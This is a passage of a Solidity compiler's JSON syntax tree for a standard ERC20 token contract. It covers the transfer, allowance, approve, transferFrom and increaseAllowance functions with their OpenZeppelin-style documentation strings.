														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 636,
												"id": 645,
												"nodeType": "Return",
												"src": "2173:11:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-transfer}.\n\n     * Requirements:\n\n     * - `recipient` cannot be the zero address.\n- the caller must have a balance of at least `amount`.",
									"id": 647,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 633,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 630,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 647,
												"src": "2054:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 629,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2054:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 632,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 647,
												"src": "2073:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 631,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2073:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2053:35:1"
									},
									"returnParameters": {
										"id": 636,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 635,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 647,
												"src": "2105:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 634,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2105:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2104:6:1"
									},
									"scope": 966,
									"src": "2036:156:1",
									"stateMutability": "nonpayable",
									"superFunction": 1047,
									"visibility": "public"
								},
								{
									"body": {
										"id": 662,
										"nodeType": "Block",
										"src": "2336:53:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 656,
															"name": "_allowances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 606,
															"src": "2354:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																"typeString": "mapping(address => mapping(address => uint256))"
															}
														},
														"id": 658,
														"indexExpression": {
															"argumentTypes": null,
															"id": 657,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 649,
															"src": "2366:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "2354:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 660,
													"indexExpression": {
														"argumentTypes": null,
														"id": 659,
														"name": "spender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 651,
														"src": "2373:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "2354:27:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 655,
												"id": 661,
												"nodeType": "Return",
												"src": "2347:34:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-allowance}.",
									"id": 663,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 652,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 649,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2274:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 648,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2274:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 651,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2289:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 650,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2289:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2273:32:1"
									},
									"returnParameters": {
										"id": 655,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 654,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2327:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 653,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2327:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2326:9:1"
									},
									"scope": 966,
									"src": "2255:134:1",
									"stateMutability": "view",
									"superFunction": 1056,
									"visibility": "public"
								},
								{
									"body": {
										"id": 681,
										"nodeType": "Block",
										"src": "2607:77:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 673,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "2627:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 674,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2627:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 675,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 665,
															"src": "2639:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 676,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 667,
															"src": "2648:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 672,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 937,
														"src": "2618:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 677,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2618:36:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 678,
												"nodeType": "ExpressionStatement",
												"src": "2618:36:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 679,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2672:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 671,
												"id": 680,
												"nodeType": "Return",
												"src": "2665:11:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-approve}.\n\n     * Requirements:\n\n     * - `spender` cannot be the zero address.",
									"id": 682,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 668,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 665,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 682,
												"src": "2553:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 664,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2553:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 667,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 682,
												"src": "2570:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 666,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2570:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2552:32:1"
									},
									"returnParameters": {
										"id": 671,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 670,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 682,
												"src": "2601:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 669,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2601:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2600:6:1"
									},
									"scope": 966,
									"src": "2536:148:1",
									"stateMutability": "nonpayable",
									"superFunction": 1065,
									"visibility": "public"
								},
								{
									"body": {
										"id": 716,
										"nodeType": "Block",
										"src": "3250:161:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 694,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 684,
															"src": "3271:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 695,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 686,
															"src": "3279:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 696,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 688,
															"src": "3290:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 693,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 809,
														"src": "3261:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 697,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3261:36:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 698,
												"nodeType": "ExpressionStatement",
												"src": "3261:36:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 700,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 684,
															"src": "3317:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 701,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "3325:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 702,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3325:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 710,
																	"name": "amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 688,
																	"src": "3373:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 703,
																			"name": "_allowances",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 606,
																			"src": "3337:11:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																				"typeString": "mapping(address => mapping(address => uint256))"
																			}
																		},
																		"id": 705,
																		"indexExpression": {
																			"argumentTypes": null,
																			"id": 704,
																			"name": "sender",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 684,
																			"src": "3349:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "3337:19:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 708,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 706,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1241,
																			"src": "3357:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 707,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "3357:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "3337:31:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 709,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1145,
																"src": "3337:35:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 711,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3337:43:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 699,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 937,
														"src": "3308:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 712,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3308:73:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 713,
												"nodeType": "ExpressionStatement",
												"src": "3308:73:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 714,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3399:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 692,
												"id": 715,
												"nodeType": "Return",
												"src": "3392:11:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-transferFrom}.\n\n     * Emits an {Approval} event indicating the updated allowance. This is not\nrequired by the EIP. See the note at the beginning of {ERC20};\n\n     * Requirements:\n- `sender` and `recipient` cannot be the zero address.\n- `sender` must have a balance of at least `value`.\n- the caller must have allowance for `sender`'s tokens of at least\n`amount`.",
									"id": 717,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 689,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 684,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 717,
												"src": "3177:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 683,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3177:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 686,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 717,
												"src": "3193:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 685,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3193:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 688,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 717,
												"src": "3212:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 687,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3212:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3176:51:1"
									},
									"returnParameters": {
										"id": 692,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 691,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 717,
												"src": "3244:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 690,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3244:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3243:6:1"
									},
									"scope": 966,
									"src": "3155:256:1",
									"stateMutability": "nonpayable",
									"superFunction": 1076,
									"visibility": "public"
								},
								{
									"body": {
										"id": 743,
										"nodeType": "Block",
										"src": "3906:120:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 727,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "3926:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 728,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3926:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 729,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 719,
															"src": "3938:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 737,
																	"name": "addedValue",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 721,
																	"src": "3984:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 730,
																			"name": "_allowances",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 606,
																			"src": "3947:11:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																				"typeString": "mapping(address => mapping(address => uint256))"
																			}
																		},
																		"id": 733,
																		"indexExpression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 731,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1241,
																				"src": "3959:3:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 732,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "3959:10:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "3947:23:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 735,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 734,
																		"name": "spender",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 719,
																		"src": "3971:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "3947:32:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 736,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "add",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1120,
																"src": "3947:36:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 738,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3947:48:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 726,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 937,
														"src": "3917:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 739,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3917:79:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 740,
												"nodeType": "ExpressionStatement",
												"src": "3917:79:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 741,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4014:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 725,
												"id": 742,
												"nodeType": "Return",
												"src": "4007:11:1"
											}
										]
									},
									"documentation": "@dev Atomically increases the allowance granted to `spender` by the caller.\n\n     * This is an alternative to {approve} that can be used as a mitigation for\nproblems described in {IERC20-approve}.\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     * Requirements:\n\n     * - `spender` cannot be the zero address.",
									"id": 744,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "increaseAllowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 722,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 719,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 744,
												"src": "3847:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 718,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3847:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 721,
												"name": "addedValue",
												"nodeType": "VariableDeclaration",
												"scope": 744,
												"src": "3864:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 720,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3864:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3846:37:1"
									},
									"returnParameters": {
										"id": 725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 724,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 744,
												"src": "3900:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 723,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3900:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3899:6:1"
									},
									"scope": 966,
									"src": "3820:206:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 770,
										"nodeType": "Block",
										"src": "4620:125:1",
										"statements": [
											{
